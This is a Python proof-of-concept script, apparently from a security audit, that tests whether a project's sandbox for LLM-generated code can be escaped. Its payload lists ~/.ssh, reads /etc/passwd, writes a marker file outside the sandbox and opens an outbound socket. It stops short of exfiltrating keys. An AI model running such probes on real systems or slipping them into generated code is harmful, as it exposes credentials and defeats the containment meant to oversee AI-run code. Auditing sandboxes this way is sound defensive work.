"""PoC #1 — Sandbox escape via code_genome / utils/sandbox.run_in_sandbox.

Hypothesis: LLM-generated code is executed in a subprocess without kernel
isolation (no namespaces / seccomp / chroot). Therefore the code can:
  - read files in the user HOME (e.g. ~/.ssh/id_rsa)
  - make outbound network calls
  - access /etc, /proc, etc.

We don't actually try to exfiltrate id_rsa (we don't want to leak anything);
instead we *prove* it could by showing that the sandbox lets the payload:
  1) read the user's HOME directory,
  2) list /etc, /proc, ~/.ssh existence,
  3) open a TCP socket to a public host,
  4) read the contents of /etc/passwd (always world-readable).
"""

from __future__ import annotations

import os
import sys
import textwrap

sys.path.insert(0, "/home/user/cambrian")

from cambrian.utils.sandbox import run_in_sandbox

PAYLOAD = textwrap.dedent(
    """
    import os, socket, pathlib

    home = os.path.expanduser("~")
    print("HOME=" + home)
    print("UID=" + str(os.getuid()))
    print("CWD=" + os.getcwd())

    ssh_dir = pathlib.Path(home) / ".ssh"
    print("ssh_dir_exists=" + str(ssh_dir.exists()))
    if ssh_dir.exists():
        print("ssh_dir_contents=" + str(sorted(p.name for p in ssh_dir.iterdir())))

    # Read /etc/passwd (world-readable, demonstrates filesystem access)
    try:
        with open("/etc/passwd") as f:
            first = f.readline().strip()
        print("passwd_first_line=" + first)
    except Exception as exc:
        print("passwd_err=" + repr(exc))

    # Write a file outside the sandbox (proves arbitrary FS write)
    marker = "/tmp/cambrian_poc1_pwn.txt"
    try:
        with open(marker, "w") as f:
            f.write("pwned by sandbox escape\\n")
        print("wrote_marker=" + marker)
    except Exception as exc:
        print("write_err=" + repr(exc))

    # Network egress test (best-effort, may fail offline)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect(("1.1.1.1", 53))
        print("net_egress=OK")
        s.close()
    except Exception as exc:
        print("net_egress_err=" + repr(exc))
    """
)


def main() -> None:
    real_home = os.path.expanduser("~")
    print(f"[host] real HOME = {real_home}")
    print(f"[host] real UID  = {os.getuid()}")
    print("[host] launching payload via cambrian.utils.sandbox.run_in_sandbox ...")

    result = run_in_sandbox(PAYLOAD, timeout=8.0)

    print("---- sandbox stdout ----")
    print(result.stdout)
    print("---- sandbox stderr ----")
    print(result.stderr)
    print(f"---- returncode={result.returncode} timed_out={result.timed_out} ----")

    # Did the payload read host HOME?
    leaked_home = f"HOME={real_home}" in result.stdout
    wrote_marker = "wrote_marker=/tmp/cambrian_poc1_pwn.txt" in result.stdout
    has_passwd = "passwd_first_line=" in result.stdout

    print()
    print(f"[verdict] leaked_HOME={leaked_home}")
    print(f"[verdict] wrote_outside_marker={wrote_marker}")
    print(f"[verdict] read_etc_passwd={has_passwd}")

    if leaked_home and wrote_marker and has_passwd:
        print("[verdict] CONFIRMED: subprocess has full FS access of host user")
    else:
        print("[verdict] PARTIAL OR DENIED")


if __name__ == "__main__":
    main()
